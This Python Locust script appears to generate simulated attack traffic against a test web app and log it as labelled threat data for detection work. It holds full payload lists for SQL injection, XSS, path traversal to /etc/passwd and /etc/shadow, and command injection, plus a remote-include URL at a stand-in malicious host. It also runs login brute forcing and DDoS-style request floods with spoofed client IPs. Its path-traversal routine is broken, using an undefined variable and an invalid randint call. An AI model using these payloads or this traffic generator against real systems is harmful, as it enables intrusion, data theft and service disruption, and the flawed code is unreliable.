import random
import json
import logging
import time
import uuid
import os
from locust import HttpUser, task, between, events
from locust.runners import MasterRunner
from datetime import datetime
import gevent

json_logger = logging.getLogger('json_logger')
json_logger.setLevel(logging.INFO)
json_handler = logging.FileHandler('/mnt/logs/threat_locust_json.log')
json_handler.setFormatter(logging.Formatter('%(message)s'))
json_logger.addHandler(json_handler)

logging.basicConfig(level=logging.INFO)
user_stats_logger = logging.getLogger('user_stats')
file_handler = logging.FileHandler('/mnt/logs/user_stats.log')
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
user_stats_logger.addHandler(file_handler)
user_stats_logger.propagate = False


class DynamicMaliciousUser(HttpUser):
    wait_time = between(1, 10)
    abstract = True
    host = os.environ.get('LOCUST_HOST', 'http://web:5000')
    instances = []

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__class__.instances.append(self)
        self.is_active = False
        self.last_active_time = time.time()
        self.activation_cooldown = random.uniform(30, 300)
        self.randomuser()

    def randomuser(self):
        self.user_id = str(uuid.uuid4())
        self.session_id = str(uuid.uuid4())
        self.client_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.user_agent = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'sqlmap/1.4.7#stable (http://sqlmap.org)',
            'Nikto/2.1.6',
            'Acunetix-WebVulnerability-Scanner/1.0',
        ])
        self.geolocation = random.choice([
            {"country": "Russia", "city": "Moscow", "timezone": "Europe/Moscow"},
            {"country": "China", "city": "Beijing", "timezone": "Asia/Shanghai"},
            {"country": "United States", "city": "Ashburn", "timezone": "America/New_York"},
            {"country": "Netherlands", "city": "Amsterdam", "timezone": "Europe/Amsterdam"},
        ])

    def get_headers(self):
        return {
            'X-Forwarded-For': self.client_ip,
            'User-Agent': self.user_agent
        }

    def on_start(self):
        self.is_active = True
        self.last_active_time = time.time()

    def on_stop(self):
        self.__class__.instances.remove(self)

    @task(2)
    def sql_injection_attempt(self):
        if not self.is_active:
            return
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT username, password FROM users--",
            "admin'--",
            "1; DROP TABLE users--",
            "' OR 1=1--",
            "' UNION SELECT null, version()--",
            "' AND 1=2 UNION SELECT null, null--",
            "' OR 'x'='x'--",
            "1; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "http://malicious-website.com/malicious-script.php",
            "1; ls -la",
            "1 && whoami",
        ]
        payload = random.choice(payloads)
        self._log_request("GET", f"/products?id={payload}", None, "sql_injection")

    @task(2)
    def xss_attempt(self):
        if not self.is_active:
            return
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ]
        payload = random.choice(payloads)
        self._log_request("POST", "/search", {"q": payload}, "xss")

    @task(2)
    def brute_force_login(self):
        if not self.is_active:
            return
        usernames = ['admin', 'root', 'user', 'test', 'guest', 'applebee', 'ofgirl', 'bigbuffmen', 'alphagamer101',
                     'donaldtrump']
        passwords = ['password', '123456', 'admin', 'qwerty', 'letmein', 'nonosquare']

        for username in usernames:
            for password in passwords:
                self.randomuser()
                self._log_request("POST", "/login", {"username": username, "password": password}, "brute_force")

    @task(1)
    def path_traversal_attempt(self):
        if not self.is_active:
            return
        if choice == 1:
            retries = random.randint(1.5)
            for _ in range(retries):
                self.randomuser()
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/hosts",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                ]
                payload = random.choice(payloads)
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
        if choice == 2:
            retries = random.randint(1.5)
            for _ in range(retries):
                self.randomuser()
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/hosts",
                    "../../../var/log/auth.log",  # Linux auth logs
                    "../../../var/www/html/config.php",  # PHP config files
                    "..\\..\\..\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat",  # Windows user data
                    "..\\..\\..\\Program Files\\Common Files\\system\\ole db\\msdasqlr.dll",  # Windows DLL
                    "../../../etc/shadow",  # Linux shadow file
                    "../../../opt/tomcat/conf/tomcat-users.xml"  # Tomcat configuration
                ]
                encoded_payloads = [
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",
                ]

                payload = random.choice(payloads + encoded_payloads)
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
        if choice == 3:
            retries = random.randint(1.5)
            for _ in range(retries):
                depth = random.randint(1, 6)
                traversal = "../" * depth
                file_target = random.choice([
                    "etc/passwd",
                    "etc/hosts",
                    "var/log/apache2/access.log",
                    "windows/win.ini"
                ])

                payload = f"{traversal}{file_target}"
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")

    @task(1)
    def command_injection_attempt(self):
        if not self.is_active:
            return
        payloads = [
            "; cat /etc/passwd",
            "& ipconfig",
            "| ls -la",
            "`whoami`",
            "$(echo 'vulnerable')",
        ]
        payload = random.choice(payloads)
        self._log_request("GET", f"/exec?cmd=date{payload}", None, "command_injection")

    @task(2)
    def web_scraping(self):
        if not self.is_active:
            return
        randomuser = random.randint(1,2)
        choice = random.randint(1,3)
        if choice == 1:
            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", "/information", "/aboutus"]
            for page in pages:
                self.randomuser()
                self._log_request("GET", page, None, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time
        elif choice == 2:
            search_terms = ["laptop", "phone", "book", "shirt", "headphones", "tablet", "watch", "camera", "shoes", "jacket", "backpack", "sunglasses", "speaker", "smartwatch", "keyboard", "mouse", "charger", "t-shirt", "monitor", "desk"]
            pages = ["/products", "/categories", "/reviews", "/comments", "/information"]
            for term in search_terms:
                page = random.choice(pages)
                if randomuser == 1:
                    self.randomuser()
                data = {"search_term": term}
                self._log_request("POST", page, data, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time
        elif choice == 3:
            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", '/information', '/aboutus']
            for page in pages:
                self._log_request("GET", page, None, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time

    @task(2)
    def ddos_simulation(self):
        if not self.is_active:
            return
        randomuser = random.randint(1,2)
        for _ in range(random.randint(5, 15)):
            # Randomize user_id, session_id, client_ip, and user_agent
            if randomuser == 1:
                self.randomuser()

            actions = [
                lambda: self._log_request("GET", "/", None, "ddos"),
                lambda: self._log_request("GET", f"/products/{random.randint(1, 10)}", None, "ddos"),
                lambda: self._log_request("POST", "/cart", {"product_id": random.randint(1, 10), "quantity": 1}, "ddos"),
                lambda: self._log_request("GET", "/cart", None, "ddos"),
                lambda: self._log_request("POST", "/checkout", {"payment_method": "credit_card"}, "ddos")
            ]

            for _ in range(random.randint(1, 20)):
                random.choice(actions)()

    def _log_request(self, method, path, data, threat_type):
        log_id = str(uuid.uuid4())
        start_time = time.time()
        headers = self.get_headers()
        try:
            if method == "GET":
                response = self.client.get(path, headers=headers)
            elif method == "POST":
                response = self.client.post(path, json=data, headers=headers)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            self._log_response(log_id, method, path, response, start_time, data, threat_type)
        except Exception as e:
            self._log_exception(log_id, method, path, e, start_time, data, threat_type)

    def _log_response(self, log_id, method, path, response, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": response.status_code,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "bytes_sent": len(response.request.body) if response.request.body else 0,
            "bytes_received": len(response.content),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "request_headers": self.get_headers(),
            "response_headers": dict(response.headers),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
        json_logger.info(json.dumps(log_entry))

    def _log_exception(self, log_id, method, path, exception, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": 500,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "exception": str(exception),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
        json_logger.info(json.dumps(log_entry))


class SQLInjectionUser(DynamicMaliciousUser):
    weight = 3
    tasks = [DynamicMaliciousUser.sql_injection_attempt]

class XSSUser(DynamicMaliciousUser):
    weight = 3
    tasks = [DynamicMaliciousUser.xss_attempt]

class PathTraversalUser(DynamicMaliciousUser):
    weight = 2
    tasks = [DynamicMaliciousUser.path_traversal_attempt]

class CommandInjectionUser(DynamicMaliciousUser):
    weight = 2
    tasks = [DynamicMaliciousUser.command_injection_attempt]

class BruteForceUser(DynamicMaliciousUser):
    weight = 2
    tasks = [DynamicMaliciousUser.brute_force_login]

class WebScrapingUser(DynamicMaliciousUser):
    weight = 2
    tasks = [DynamicMaliciousUser.web_scraping]

class DDOSUser(DynamicMaliciousUser):
    weight = 2
    tasks = [DynamicMaliciousUser.ddos_simulation]

def manage_user_lifecycle(environment):
    for user_class in environment.user_classes:
        for user_instance in user_class.instances:
            current_time = time.time()
            if user_instance.is_active:
                if random.random() < 0.1:
                    user_instance.is_active = False
                    user_instance.last_active_time = current_time
                    user_instance.activation_cooldown = random.uniform(10, 30)
                    logging.info(f"User {user_instance.user_id} deactivated")
            elif current_time - user_instance.last_active_time > user_instance.activation_cooldown:
                if random.random() < 0.3:
                    user_instance.is_active = True
                    user_instance.last_active_time = current_time
                    logging.info(f"User {user_instance.user_id} activated")


def log_user_stats(environment):
    stats = {user_class.__name__: {'active': 0, 'inactive': 0} for user_class in environment.user_classes}

    for user_class in environment.user_classes:
        for user in user_class.instances:
            if user.is_active:
                stats[user_class.__name__]['active'] += 1
            else:
                stats[user_class.__name__]['inactive'] += 1

    log_message = "User Statistics:\n"
    for user_type, counts in stats.items():
        log_message += f"{user_type}: Active: {counts['active']}, Inactive: {counts['inactive']}\n"

    user_stats_logger.info(log_message)


@events.init.add_listener
def on_locust_init(environment, **kwargs):
    if not isinstance(environment.runner, MasterRunner):
        gevent.spawn(periodic_tasks, environment)
        environment.runner.spawn_users({
            SQLInjectionUser.__name__: 10,
            XSSUser.__name__: 10,
            PathTraversalUser.__name__: 5,
            CommandInjectionUser.__name__: 5,
            BruteForceUser.__name__: 5,
            WebScrapingUser.__name__: 5,
            DDOSUser.__name__: 5,
        })


def periodic_tasks(environment):
    while True:
        manage_user_lifecycle(environment)
        log_user_stats(environment)
        gevent.sleep(5)
